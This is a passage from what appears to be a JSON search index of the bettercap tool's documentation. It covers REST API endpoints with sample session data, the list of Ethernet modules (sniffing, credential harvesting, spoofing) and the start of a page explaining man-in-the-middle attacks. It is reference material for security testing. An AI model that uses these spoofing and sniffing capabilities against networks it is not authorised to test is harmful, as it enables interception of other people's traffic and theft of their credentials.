GmbH\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661807871+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661807871+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.22\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;yamato\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Apple\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661869827+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:13.734671382+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.254\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;gateway\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.6617926+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.6617926+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.26\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;winvm\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;PCS Systemtechnik GmbH\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661830083+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661830083+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.76\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;pibak\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Raspberry Pi Foundation\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661833177+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:07.391079854+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.3\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;00:17:88:29:97:bc\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;lights\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Philips Lighting BV\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661849075+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:14.306812147+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.23\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;pihole\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Raspberry Pi Foundation\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661854928+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:14.786637323+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }] }, \u0026quot;wifi\u0026quot;: { \u0026quot;aps\u0026quot;: [] }, \u0026quot;packets\u0026quot;: { \u0026quot;Stats\u0026quot;: { \u0026quot;Sent\u0026quot;: 1080, \u0026quot;Received\u0026quot;: 213207, \u0026quot;PktReceived\u0026quot;: 3549, \u0026quot;Errors\u0026quot;: 0 }, \u0026quot;Protos\u0026quot;: { \u0026quot;ARP\u0026quot;: 2918, \u0026quot;DNS\u0026quot;: 32, \u0026quot;Ethernet\u0026quot;: 3549, \u0026quot;ICMPv4\u0026quot;: 44, \u0026quot;IPv4\u0026quot;: 631, \u0026quot;TCP\u0026quot;: 394, \u0026quot;UDP\u0026quot;: 193 }, \u0026quot;Traffic\u0026quot;: { \u0026quot;192.168.1.0\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 215 }, \u0026quot;192.168.1.1\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 289 }, \u0026quot;192.168.1.13\u0026quot;: { \u0026quot;Sent\u0026quot;: 415, \u0026quot;Received\u0026quot;: 289 }, \u0026quot;192.168.1.14\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 289 }, \u0026quot;192.168.1.17\u0026quot;: { \u0026quot;Sent\u0026quot;: 41356, \u0026quot;Received\u0026quot;: 46456 }, \u0026quot;192.168.1.20\u0026quot;: { \u0026quot;Sent\u0026quot;: 2658, \u0026quot;Received\u0026quot;: 2018 }, \u0026quot;192.168.1.22\u0026quot;: { \u0026quot;Sent\u0026quot;: 1426, \u0026quot;Received\u0026quot;: 215 }, \u0026quot;192.168.1.23\u0026quot;: { \u0026quot;Sent\u0026quot;: 2220, \u0026quot;Received\u0026quot;: 1747 }, \u0026quot;192.168.1.254\u0026quot;: { \u0026quot;Sent\u0026quot;: 120, \u0026quot;Received\u0026quot;: 320 }, \u0026quot;192.168.1.255\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 1140 }, \u0026quot;192.168.1.26\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 215 }, \u0026quot;192.168.1.29\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 215 }, \u0026quot;192.168.1.3\u0026quot;: { \u0026quot;Sent\u0026quot;: 1438, \u0026quot;Received\u0026quot;: 654 }, \u0026quot;192.168.1.33\u0026quot;: { \u0026quot;Sent\u0026quot;: 130, \u0026quot;Received\u0026quot;: 355 }, \u0026quot;192.168.1.34\u0026quot;: { \u0026quot;Sent\u0026quot;: 2303, \u0026quot;Received\u0026quot;: 2018 }, \u0026quot;192.168.1.43\u0026quot;: { \u0026quot;Sent\u0026quot;: 10756, \u0026quot;Received\u0026quot;: 8721 }, \u0026quot;192.168.1.6\u0026quot;: { \u0026quot;Sent\u0026quot;: 497, \u0026quot;Received\u0026quot;: 375 }, \u0026quot;192.168.1.76\u0026quot;: { \u0026quot;Sent\u0026quot;: 284, \u0026quot;Received\u0026quot;: 172 }, \u0026quot;192.168.1.78\u0026quot;: { \u0026quot;Sent\u0026quot;: 284, \u0026quot;Received\u0026quot;: 172 } } }, \u0026quot;started_at\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;active\u0026quot;: true }    GET /api/session/ble Get a JSON of the BLE devices in the current session, example response:\n  Expand for the example JSON   { \u0026quot;devices\u0026quot;: [{ \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;Adafruit Bluefruit LE\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;00:AA:BB:CC:DD:33\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;rssi\u0026quot;: -68 }, { \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;rssi\u0026quot;: -64 }] }    Optional Arguments  Mac address, eg. GET /api/session/ble/00:AA:BB:CC:DD:33 - return information of a single ble endpoint with the mac address of 00:AA:BB:CC:DD:33 (the Adafruit Bluefruit LE client from the above output).  GET /api/session/env Get a JSON of the environment variables in the current session, example response:\n  Expand for the example JSON   { \u0026quot;data\u0026quot;: { \u0026quot;$\u0026quot;: \u0026quot;{by}{fw}{cidr} {fb}\\u003e {env.iface.ipv4} {reset} {bold}» {reset}\u0026quot;, \u0026quot;api.rest.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;api.rest.certificate\u0026quot;: \u0026quot;~/.bcap-api.rest.certificate.pem\u0026quot;, \u0026quot;api.rest.key\u0026quot;: \u0026quot;~/.bcap-api.rest.key.pem\u0026quot;, \u0026quot;api.rest.password\u0026quot;: \u0026quot;bcap\u0026quot;, \u0026quot;api.rest.port\u0026quot;: \u0026quot;8083\u0026quot;, \u0026quot;api.rest.username\u0026quot;: \u0026quot;bcap\u0026quot;, \u0026quot;arp.spoof.targets\u0026quot;: \u0026quot;\\u003centire subnet\\u003e\u0026quot;, \u0026quot;dhcp6.spoof.domains\u0026quot;: \u0026quot;microsoft.com, goole.com, facebook.com, apple.com, twitter.com\u0026quot;, \u0026quot;dns.spoof.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;dns.spoof.all\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;dns.spoof.domains\u0026quot;: \u0026quot;*\u0026quot;, \u0026quot;events.stream.filter\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;gateway.address\u0026quot;: \u0026quot;192.168.1.1\u0026quot;, \u0026quot;gateway.mac\u0026quot;: \u0026quot;e0:b9:e5:17:22:e4\u0026quot;, \u0026quot;http.port\u0026quot;: \u0026quot;80\u0026quot;, \u0026quot;http.proxy.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;http.proxy.port\u0026quot;: \u0026quot;8080\u0026quot;, \u0026quot;http.proxy.script\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;http.server.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;http.server.path\u0026quot;: \u0026quot;.\u0026quot;, \u0026quot;http.server.port\u0026quot;: \u0026quot;80\u0026quot;, \u0026quot;https.port\u0026quot;: \u0026quot;443\u0026quot;, \u0026quot;https.proxy.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;https.proxy.certificate\u0026quot;: \u0026quot;~/.bettercap-ca.cert.pem\u0026quot;, \u0026quot;https.proxy.key\u0026quot;: \u0026quot;~/.bettercap-ca.key.pem\u0026quot;, \u0026quot;https.proxy.port\u0026quot;: \u0026quot;8083\u0026quot;, \u0026quot;https.proxy.script\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;iface.index\u0026quot;: \u0026quot;6\u0026quot;, \u0026quot;iface.ipv4\u0026quot;: \u0026quot;192.168.1.17\u0026quot;, \u0026quot;iface.ipv6\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;iface.mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;iface.name\u0026quot;: \u0026quot;enx18fffffff\u0026quot;, \u0026quot;log.debug\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;log.silent\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;mac.changer.address\u0026quot;: \u0026quot;\\u003crandom mac\\u003e\u0026quot;, \u0026quot;mac.changer.iface\u0026quot;: \u0026quot;\\u003cinterface name\\u003e\u0026quot;, \u0026quot;net.probe.throttle\u0026quot;: \u0026quot;10\u0026quot;, \u0026quot;net.sniff.filter\u0026quot;: \u0026quot;not arp\u0026quot;, \u0026quot;net.sniff.local\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;net.sniff.output\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.regexp\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.source\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.verbose\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;ticker.commands\u0026quot;: \u0026quot;clear; net.show\u0026quot;, \u0026quot;ticker.period\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;wifi.recon.channel\u0026quot;: \u0026quot;\u0026quot; } }    GET /api/session/gateway Get a JSON of the interface gateway of the current session, example response:\n  Expand for the example JSON   { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.1\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;gateway.\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Technicolor\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.649440315+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.649440315+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }    GET /api/session/interface Get a JSON of the main interface (wifi/lan) of the current session, example response:\n  Expand for the example JSON   { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.17\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;enx18fffffff\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Dell\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.565053179+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.565053179+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }    GET /api/session/lan Get a JSON of the lan devices in the current session, example response:\n  Expand for the example JSON   { \u0026quot;hosts\u0026quot;: [{ \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.33\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;nas\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Noon Technology Co.\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661773691+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:10.402653849+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.29\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;osxvm\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;PCS Systemtechnik GmbH\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661807871+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661807871+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.23\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;00:AA:BB:CC:DD:11\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;pihole\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Raspberry Pi Foundation\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661854928+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:14.786637323+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }] }    Optional Arguments  Mac address, eg. GET /api/session/lan/00:AA:BB:CC:DD:11 - return information of a single lan endpoint with the mac address of 00:AA:BB:CC:DD:11 (the pihole from the above output).  GET /api/session/options Get a JSON of the options set for the current session, example response:\n  Expand for the example JSON   { \u0026quot;InterfaceName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Caplet\u0026quot;: \u0026quot;../caplets/netmon.cap\u0026quot;, \u0026quot;Debug\u0026quot;: false, \u0026quot;Silent\u0026quot;: false, \u0026quot;NoHistory\u0026quot;: false, \u0026quot;Commands\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;CpuProfile\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;MemProfile\u0026quot;: \u0026quot;\u0026quot; }    GET /api/session/packets Get a JSON of the packet traffic for the current session, example response:\n  Expand for the example JSON   { \u0026quot;Stats\u0026quot;: { \u0026quot;Sent\u0026quot;: 1080, \u0026quot;Received\u0026quot;: 213207, \u0026quot;PktReceived\u0026quot;: 3549, \u0026quot;Errors\u0026quot;: 0 }, \u0026quot;Protos\u0026quot;: { \u0026quot;ARP\u0026quot;: 2918, \u0026quot;DNS\u0026quot;: 32, \u0026quot;Ethernet\u0026quot;: 3549, \u0026quot;ICMPv4\u0026quot;: 44, \u0026quot;IPv4\u0026quot;: 631, \u0026quot;TCP\u0026quot;: 394, \u0026quot;UDP\u0026quot;: 193 }, \u0026quot;Traffic\u0026quot;: { \u0026quot;192.168.1.0\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 215 }, \u0026quot;192.168.1.1\u0026quot;: { \u0026quot;Sent\u0026quot;: 0, \u0026quot;Received\u0026quot;: 289 }, \u0026quot;192.168.1.34\u0026quot;: { \u0026quot;Sent\u0026quot;: 2303, \u0026quot;Received\u0026quot;: 2018 }, \u0026quot;192.168.1.76\u0026quot;: { \u0026quot;Sent\u0026quot;: 284, \u0026quot;Received\u0026quot;: 172 }, \u0026quot;192.168.1.78\u0026quot;: { \u0026quot;Sent\u0026quot;: 284, \u0026quot;Received\u0026quot;: 172 } } }    GET /api/session/started-at Get a JSON of the time the current session was started, example response:\n  Expand for the example JSON   \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;    GET /api/session/wifi Get a JSON of the wifi devices (clients and access points) in the current session, example response:\n  Expand for the example JSON   { \u0026quot;aps\u0026quot;: [{ \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;authentication\u0026quot;: \u0026quot;PSK\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;TKIP\u0026quot;, \u0026quot;clients\u0026quot;: [], \u0026quot;encryption\u0026quot;: \u0026quot;WPA2\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2412, \u0026quot;hostname\u0026quot;: \u0026quot;AP1\u0026quot;, \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} }, \u0026quot;received\u0026quot;: 0, \u0026quot;rssi\u0026quot;: -20, \u0026quot;sent\u0026quot;: 0, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot; }, { \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;authentication\u0026quot;: \u0026quot;PSK\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;TKIP\u0026quot;, \u0026quot;clients\u0026quot;: [], \u0026quot;encryption\u0026quot;: \u0026quot;WPA2\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2412, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026lt;hidden\u0026gt;\u0026quot;, \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} }, \u0026quot;received\u0026quot;: 0, \u0026quot;rssi\u0026quot;: -16, \u0026quot;sent\u0026quot;: 0, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot; }, { \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;authentication\u0026quot;: \u0026quot;PSK\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;TKIP\u0026quot;, \u0026quot;clients\u0026quot;: [], \u0026quot;encryption\u0026quot;: \u0026quot;WPA2\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2412, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026lt;hidden\u0026gt;\u0026quot;, \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} }, \u0026quot;received\u0026quot;: 0, \u0026quot;rssi\u0026quot;: -21, \u0026quot;sent\u0026quot;: 0, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot; }, { \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;authentication\u0026quot;: \u0026quot;PSK\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;CCMP\u0026quot;, \u0026quot;clients\u0026quot;: [{ \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;authentication\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;cipher\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;encryption\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2427, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;00:AA:BB:CC:DD:22\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} }, \u0026quot;received\u0026quot;: 0, \u0026quot;rssi\u0026quot;: -31, \u0026quot;sent\u0026quot;: 0, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot; }], \u0026quot;encryption\u0026quot;: \u0026quot;WPA2\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2427, \u0026quot;hostname\u0026quot;: \u0026quot;AP2\u0026quot;, \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.650628576+01:00\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} }, \u0026quot;received\u0026quot;: 3100, \u0026quot;rssi\u0026quot;: -31, \u0026quot;sent\u0026quot;: 1040, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot; }, ] }    Optional Arguments  Mac address, eg. GET /api/session/wifi/00:AA:BB:CC:DD:22 - return information of a single wifi endpoint with the mac address of 00:AA:BB:CC:DD:22 (the connected client from the above output).  POST /api/session Post a command to the interactive session, the JSON object being POSTed is expected to be:\n  Expand for the example JSON   {\u0026quot;cmd\u0026quot;: \u0026quot;net.probe on\u0026quot;}   While the response will be:\n  Expand for the example JSON   {\u0026quot;success\u0026quot;: true, \u0026quot;msg\u0026quot;:\u0026quot;\u0026quot;}    GET /api/events Return a list of events ( the optional n GET parameter will limit the number ):\n  Expand for the example JSON   [{ \u0026quot;tag\u0026quot;: \u0026quot;sys.log\u0026quot;, \u0026quot;time\u0026quot;: \u0026quot;2018-02-22T16:57:39.449618552+01:00\u0026quot;, \u0026quot;data\u0026quot;: { \u0026quot;Level\u0026quot;: 1, \u0026quot;Message\u0026quot;: \u0026quot;Ticker running with period 1s.\u0026quot; } }, { \u0026quot;tag\u0026quot;: \u0026quot;wifi.ap.new\u0026quot;, \u0026quot;time\u0026quot;: \u0026quot;2018-02-22T16:57:57.681938014+01:00\u0026quot;, \u0026quot;data\u0026quot;: { \u0026quot;ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;--\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;Some AP Name Here\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-22T16:57:57.681877278+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-22T16:57:58.104218287+01:00\u0026quot;, \u0026quot;frequency\u0026quot;: 2427, \u0026quot;rssi\u0026quot;: -56, \u0026quot;sent\u0026quot;: 0, \u0026quot;received\u0026quot;: 0, \u0026quot;encryption\u0026quot;: \u0026quot;OPEN\u0026quot;, \u0026quot;clients\u0026quot;: [] } }]    DELETE /api/events Will clear the events buffer.\n"
},
{
	"uri": "https://bettercap.org/modules/ethernet/",
	"title": "Ethernet",
	"tags": [],
	"description": "",
	"content": "These modules offer reconnaissance, active probing (mDNS, NBNS, UPnP and WSD) of hosts, sniffing / credentials harvesting, port scanning, spoofing (MITM) and a few basic servers for IP based networks:\n net.recon     net.probe     net.sniff - net.fuzz     syn.scan     wake on lan     Spoofers     Proxies     Servers     "
},
{
	"uri": "https://bettercap.org/modules/",
	"title": "Modules",
	"tags": [],
	"description": "",
	"content": "Session modules are organized in the following categories:\n Core     Bluetooth LE     WiFi     HID on 2.4Ghz     Ethernet     Utils     "
},
{
	"uri": "https://bettercap.org/modules/ethernet/spoofers/",
	"title": "Spoofers",
	"tags": [],
	"description": "",
	"content": "Spoofing modules used to perform Man-in-the-Middle attacks:\n arp.spoof     dns.spoof     dhcp6.spoof     What is a MITM Attack? According to Wikipedia:\n In cryptography and computer security, a man-in-the-middle attack (often abbreviated to MITM, MitM, MIM, MiM attack or MITMA) is an attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. Man-in-the-middle attacks can be thought about through a chess analogy. Mallory, who barely knows how to play chess, claims that she can play two grandmasters simultaneously and either win one game or draw both. She waits for the first grandmaster to make a move and then makes this same move against the second grandmaster. When the second grandmaster responds, Mallory makes the same play against the first. She plays the entire game this way and cannot lose. A man-in-the-middle attack is a similar strategy and can be used against many cryptographic protocols. One example of man-in-the-middle attacks is active eavesdropping, in which the attacker makes independent connections with the victims and relays messages between them to make them believe they are talking directly to each other over a private connection, when in fact the entire conversation is controlled by the attacker. The attacker must be able to intercept all relevant messages passing between the two victims and inject new ones. This is straightforward in many circumstances; for example, an attacker within reception range of an unencrypted Wi-Fi wireless access point, can insert himself as a man-in-the-middle.\n This is quite a generic description, mostly because ( if we\u0026rsquo;re talking about network MITM attacks ), the logic and details heavily rely on the technique being used ( more in the spoofing section ).\nNevertheless we can simplify the concept with an example. When you connect to some network ( your home network, some public WiFi, StarBucks, etc ), the router/switch is responsible for forwarding all of your packets to the correct destination, during a MITM attack we \u0026ldquo;force\u0026rdquo; the network to consider our device as the router ( we \u0026ldquo;spoof\u0026rdquo; the original router/switch address in some way ):\nOnce this happens, all of the network traffic goes through your computer instead of the legit router/switch and at that point you can do pretty much everything you want, from just sniffing for specific data ( emails, 